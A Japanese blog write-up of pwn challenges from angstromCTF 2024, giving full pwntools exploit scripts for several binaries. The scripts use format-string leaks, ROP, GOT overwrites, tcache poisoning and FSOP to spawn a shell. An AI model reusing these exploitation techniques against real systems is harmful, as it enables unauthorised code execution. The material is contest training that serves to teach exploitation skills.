+++
title = "Angstorm 2024"
date = 2024-05-30
description = "heap問はいいぞ"
[taxonomies]
tags = ["pwn", "heap"]
+++

[Angstorm](https://ctftime.org/event/2375)にTPCとして出場しました。
コンテスト中にpwn7問を解き、コンテスト後にとstacksort追加で解きました。

# [pwn] Exam

## 概要

- `trust_level`が`0x7ffffffe`超えるとflagがもらえます。
- `trust_level`は`-detrust`で初期化され、ループの中で1づつ増加させることができます。
- `detrust`は入力で与えることができます。
- `detrust`は正の範囲で入力できる。

## exploit

`detrust`を`0x7fffffff`にすることで`trust_level`を`0x80000001`にすることができます。
あとはこれに2を足す処理を行うと`trust_level`が`0x7fffffff`になりflagが得られます。

# [pwn] presidential

## 概要

任意のshellcodeを実行してくれます。

## exploit

https://www.exploit-db.com/exploits/42179
を送るとシェルが降ってきます。

# [pwn] og

## 解析

checksecをします。

```
[*] '/home/user/ctf/og/og'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 脆弱性

自明なFSBとBoFがあります。

## 攻撃

FSBを使ってlibc leakをし、BoFでmainにリターンします。その後、one_gadgetを利用してシェルを取ります。

## exploit

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i: i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
    else:
        io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    sla(b'name: ',
        b'%15$16p!' + fmtstr_payload(7, {0x404018: 0x40126d}, numbwritten=17, write_size='short') + p64(
            elf.sym['main'] + 5))
    buf = t.recvuntil(b'!')[:-1]
    print(f'{buf=}')
    libc_base = int(buf[buf.rindex(b'0x'):], 16) - 0x29d90
    print(f'{libc_base=:x}')

    sla(b'name:', b'\x00' * 0x30 + p64(0x404700) + p64(libc_base + 0xebc81))

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./og"
libc_name = ""
remote_addr, remote_port = "challs.actf.co 31312".split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
"""
t = create_io()
solve()
```

# [pwn] bap

## 解析

```
[*] '/home/user/ctf/bap/bap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 脆弱性

ogと同様にFSBとBoFがあります。

## 攻撃

FSBを使ってlibc leakをし、BoFでmainにリターンします。その後ROPをします。

## exploit

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i: i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
    else:
        io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    sla(b':', b'%29$08pFIN'.ljust(0x10, b'\x00') + p64(0x404700) + p64(elf.sym['main'] + 88) + p64(elf.sym['main']))
    libc_base = int(t.recvuntil(b'FIN')[:-3], 16) - 0x29e40
    libc.address = libc_base
    print(f'{libc_base=:x}')
    rop = ROP(libc)
    rop.execv(next(libc.search(b'/bin/sh')), 0)
    sla(b':', b'A' * 0x18 + rop.chain())

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./chall.p"
libc_name = "./libc.so.6"
remote_addr, remote_port = "challs.actf.co 31323".split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
"""
t = create_io()
solve()
```

# [pwn] leftright

## 解析

```
[*] '/home/user/ctf/left_right/leftright'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

疑似コード

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdx
  __int16 *v4; // rax
  __int16 v7; // [rsp+2h] [rbp-2Eh]
  int select; // [rsp+4h] [rbp-2Ch] BYREF
  int end; // [rsp+8h] [rbp-28h]
  int i; // [rsp+Ch] [rbp-24h]
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v12; // [rsp+28h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  printf("Name: ");
  fgets(s, 15, stdin);
  v7 = 0;
  arr[0] = 1;
  end = 0;
  while ( !end )
  {
    select = 0;
    __isoc99_scanf("%d", &select);
    getchar();
    if ( select == 3 )
    {
      end = 1;
    }
    else if ( select <= 3 )
    {
      if ( select == 2 )
      {
        arr[v7] = getchar();
      }
      else
      {
        if ( select )
        {
          if ( select != 1 )
            goto LABEL_14;
        }
        else
        {
          if ( !v7 )
          {
            puts("hey!");
            exit(1);
          }
          --v7;
        }
        ++v7;
      }
    }
LABEL_14:
    for ( i = 0; i <= 19; ++i )
    {
      if ( i )
        v3 = (const char *)asc_2014;
      else
        v3 = (const char *)&unk_2013;
      if ( arr[i] )
        v4 = &asc_2014[1];
      else
        v4 = &asc_2014[2];
      printf("%s%s", (const char *)v4, v3);
    }
    putchar(10);
  }
  puts("bye");
  puts(s);
  return v12 - __readfsqword(0x28u);
}
```

グローバル変数`arr`が存在して、`arr[v7]`に任意の値を設定することができます。

## 脆弱性

疑似コードの`v7`は無限にインクリメントすることができます。つまり、Integer Overflowがあります。\
`__int16`であるため負数にすることができます。
`arr[v7]`を(概ね)任意のアドレスにすることができるため、任意書き込みのプリミティブが得られます。

## 攻撃

`arr`の近く(アドレスがより低い方)にはGOTエントリが存在します。`v7`
をOverflowさせてGOTエントリを書き換えることができます。 \
具体的には、`exit`を書き換えることで何度でもmainを呼び出せるようにします。加えて、`puts`
がwhileループを抜けたあとにしか呼ばれないことを利用して、`puts`のGOTエントリを`printf@plt`に書き換えることで`puts(s)`
においてFSB脆弱性を発生させることができます。
\ 実際の攻撃手順は以下のとおりです。

1. `v7`をオーバーフローさせて`exit`と`puts`のGOTエントリをかきかえる。
2. `exit`を呼び出す(GOTの書き換えにより実際はmainを呼び出している)
3. FSBを利用してlibc leak
4. 再び`v7`をオーバーフローさせて`puts`のGOTエントリを`system`に書き換える
5. `puts(s)`が`system('/bin/sh')`になり、シェルを取得

## exploit

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "INFO"

s2sh = lambda pl: b"".join([p8(int(pl[i: i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
    else:
        io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)
    # overwrite exit -> main
    t.sendline(b'/bin/sh\x00')
    for i in range(0xffff & (~0x78 + 1)):
        t.sendline(b'1')
        if i % 1000 == 999:
            print(f'{i=}')
            # time.sleep(0.5)
            while buf := t.recv(timeout=0.5):
                pass
    t.sendline(b'2')
    t.sendline(p8(0x76))
    for _ in range(0x38):
        t.sendline(b'1')
    t.sendline(b'2')
    t.sendline(p8(0xb9))
    t.sendline(b'1')
    t.sendline(b'2')
    t.sendline(p8(0x11))

    for _ in range(0x100 - 0xc1):
        t.sendline(b'1')

    while True:
        if not (buf := t.recvn(0x10001, timeout=2)):
            break

    if debug:
        input("OK?")
    # second main
    t.sendline(b'0')
    sla(b':', b'%41$p FIN')
    t.sendline(b'3')
    # exit main
    buf = t.recvuntil(b'FIN')
    buf = buf[buf.rfind(b'0x'):buf.rfind(b' ')]
    print(f'{buf=}')
    libc_base = int(buf, 16) - 171584
    libc.address = libc_base
    print(f"{libc_base=:x}")

    for i in range(0xffff & (~0x78 + 1)):
        t.sendline(b'1')
        if i % 2000 == 999:
            print(f'{i=}')
            while buf := t.recv(timeout=0.5):
                pass

    for i in p64(libc.sym['system']):
        t.sendline(b'2')
        t.sendline(p8(i))
        t.sendline(b'1')

    t.sendline(b'3')

    t.interactive()


local = 1
debug = 1
radare = 0

elf_name = "./chall.p"
libc_name = "./libc.so.6"
remote_addr, remote_port = "challs.actf.co 31324".split()
if libc_name:
    libc: ELF = ELF(libc_name)

while True:
    elf: ELF = ELF(elf_name)
    script = """
    """
    t = create_io()
    try:
        solve()
    except:
        t.close()
```

# [pwn] heapify

## 解析

```
[*] '/home/user/ctf/left_right/chall.p'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

普通のメモアプリのようです。`alloc`,`delete`,`view`が可能です。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define N 32

int idx = 0;
char *chunks[N];

int readint() {
	char buf[0x10];
	read(0, buf, 0x10);
	return atoi(buf);
}

void alloc() {
	if(idx >= N) {
		puts("you've allocated too many chunks");
		return;
	}
	printf("chunk size: ");
	int size = readint();
	char *chunk = malloc(size);
	printf("chunk data: ");

	// ----------
	// VULN BELOW !!!!!!
	// ----------
	gets(chunk);
	// ----------
	// VULN ABOVE !!!!!!
	// ----------

	printf("chunk allocated at index: %d\n", idx);
	chunks[idx++] = chunk;
}

void delete() {
	printf("chunk index: ");
	int i = readint();
	if(i >= N || i < 0 || !chunks[i]) {
		puts("bad index");
		return;
	}
	free(chunks[i]);
	chunks[i] = 0;
}

void view() {
	printf("chunk index: ");
	int i = readint();
	if(i >= N || i < 0 || !chunks[i]) {
		puts("bad index");
		return;
	}
	puts(chunks[i]);
}

int menu() {
	puts("--- welcome 2 heap ---");
	puts("1) allocate");
	puts("2) delete");
	puts("3) view");
}

int main() {
	setbuf(stdout, 0);
	menu();
	for(;;) {
		printf("your choice: ");
		switch(readint()) {
		case 1:
			alloc();
			break;
		case 2:
			delete();
			break;
		case 3:
			view();
			break;
		default:
			puts("exiting");
			return 0;
		}
	}
}
```

## 脆弱性

ソースコードにもわかりやすく書いてある通り、`gets`が使われています。

## 攻撃

chunkのサイズを偽造してすでに存在するチャンクにかぶせて新しくチャンクをallocすることで、`view`を通したlibc、heap
leakができます。

1. heapをalloc
2. heapのサイズを偽造してunsorted binに繋ぐ
3. libc, heapをleak
4. FSOPでshellを取得

## exploit

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i: i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
    else:
        io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t, libc
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    def alloc(_size: int, _data: bytes = ''):
        sla(b'choice:', i2b(1))
        sla(b'size: ', i2b(_size))
        sla(b'data: ', _data)

    def delete(idx: int):
        sla(b'choice:', i2b(2))
        sla(b'index: ', i2b(idx))

    def view(idx: int) -> bytes:
        sla(b'choice:', i2b(3))
        sla(b'index: ', i2b(idx))
        return t.recvuntil(b'your ')[:-5]

    alloc(0x28)  # 0
    alloc(0x28)  # 1
    alloc(0x1)  # 2
    alloc(0x1)  # 3
    alloc(0x3e0)  # 4
    alloc(0x28)  # 5
    delete(1)
    alloc(0x28, p8(0) * 0x28 + p64(0x431))
    delete(2)
    alloc(0x1)  # 6
    libc_base = s2u64(view(3).splitlines()[0]) - 0x21ace0
    print(f'{libc_base=:x}')
    alloc(0x1)  # 7
    alloc(0x1)  # 8
    delete(4)
    heap_base = (s2u64(view(9).splitlines()[0]) - 1) << 12
    print(f'{heap_base=:x}')

    libc.address = libc_base
    fake_io = heap_base + 0x1770
    payload = (
            b'/bin/sh\x00'  # rdi
            + p64(0) * 8
            + p64(1)  # rcx (!=0)
            + p64(2)  # rdx
            + p64(libc.sym["system"])
            + p64(1)
            + p64(0) * 4
            + p64(heap_base + 0x5000)  # writable area
            + p64(0) * 2
            + p64(fake_io + 0x30)
            + p64(0) * 3
            + p64(1)
            + p64(0) * 2
            + p64(libc.sym['_IO_wfile_jumps'] + 0x30)  # _wide_data
            + p64(0) * 6
            + p64(fake_io + 0x40)
    )
    alloc(0x400, payload)
    alloc(0x3c0, payload)

    alloc(0x30)  # 12
    alloc(0x30)  # 13
    alloc(0x30)  # 14
    delete(14)
    delete(13)
    delete(12)
    IO_list_all = libc_base + 0x21b680
    alloc(0x30, b'A' * 0x38 + p64(0x41) + p64(ptr_guard(heap_base + 0x1bf0, IO_list_all)))
    alloc(0x30)
    alloc(0x30, p64(fake_io))
    sla(b'choice:', i2b(0))
    t.interactive()


local = 0
debug = 1
radare = 0

elf_name = "./chall.p"
libc_name = "./libc.so.6"
remote_addr, remote_port = "challs.actf.co 31501".split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
"""
t = create_io()
solve()
```

# [pwn] themectl

## 解析

```
[*] '/home/user/ctf/themectl/chall.p'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

プログラムの機能としてはユーザを作成しログインすることができ、それぞれのユーザが任意個のthemeを作成することができます。

## exploit
```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i: i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
    else:
        io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t

    def sla(x, y):
        t.sendline(y)
        time.sleep(0.1)

    sa = lambda x, y: t.sendafter(x, y)

    def register(username: bytes, passwd: bytes, num: int):
        t.sendlineafter(b'>', i2b(1))
        sla(b'name: ', username)
        sla(b'password: ', passwd)
        sla(b'like?', i2b(num))

    def login(username: bytes, passwd: bytes):
        t.sendlineafter(b'>', i2b(2))
        sla(b'name: ', username)
        sla(b'password: ', passwd)

    def edit(idx: int, content: bytes):
        t.sendlineafter(b'>', i2b(1))
        sla(b'edit?', i2b(idx))
        sla(b'idea: ', content)

    def view(idx: int) -> bytes:
        t.sendlineafter(b'>', i2b(2))
        t.sendlineafter(b'view? ', i2b(idx))
        return t.recvuntil(b'--- OPTIONS ---')[:-16]

    def logout():
        sla(b'>', i2b(4))

    register(b'A', b'', 0x190)
    edit(0, b'')
    logout()
    n = 0xc
    register(b'B', b'', n)
    edit(0, b'')
    logout()
    login(b'A', b'')
    edit(0, b'@' * 0x28 + p64(n * 8 + 0x11) + p64(n))
    logout()
    login(b'B', b'')
    buf = view(0)
    print(f'{buf=}')
    heap_base = s2u64(buf) - 0x1120
    print(f'{heap_base=:x}')

    logout()
    register(b'C', b'', 1)
    edit(0, b'A' * 0x28 + p64(0xdd1))
    logout()
    register(b'D', b'', 0xe00 // 8)
    logout()

    libc_addr_ptr = heap_base + 0x12a0
    login(b'A', b'')
    edit(0, b'@' * 0x28 + p64(n * 8 + 0x11) + p64(n) + p64(libc_addr_ptr))
    logout()
    login(b'B', b'')
    libc_base = s2u64(view(0)) - 0x21ace0
    libc.address = libc_base
    print(f'{libc_base=:x}')
    logout()
    login(b'A', b'')
    IO_list_all = libc_base + 0x21b680
    edit(0, b'@' * 0x28 + p64(n * 8 + 0x11) + p64(n) + p64(IO_list_all))
    logout()
    login(b'B', b'')
    fake_io = heap_base + 0x1210
    edit(0, p64(fake_io))
    logout()
    login(b'C', b'')
    payload = (
            b'/bin/sh\x00'  # rdi
            + p64(0) * 8
            + p64(1)  # rcx (!=0)
            + p64(2)  # rdx
            + p64(libc.sym["system"])
            + p64(1)
            + p64(0) * 4
            + p64(heap_base + 0x5000)  # writable area
            + p64(0) * 2
            + p64(fake_io + 0x30)
            + p64(0) * 3
            + p64(1)
            + p64(0) * 2
            + p64(libc.sym['_IO_wfile_jumps'] + 0x30)  # _wide_data
            + p64(0) * 6
            + p64(fake_io + 0x40)
    )
    edit(0, payload)
    logout()
    sla(b'>', i2b(3))

    t.interactive()


local = 1
debug = 1
radare = 0

elf_name = "./themectl"
libc_name = "./libc.so.6"
remote_addr, remote_port = "challs.actf.co 31325".split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
"""
t = create_io()
solve()
```
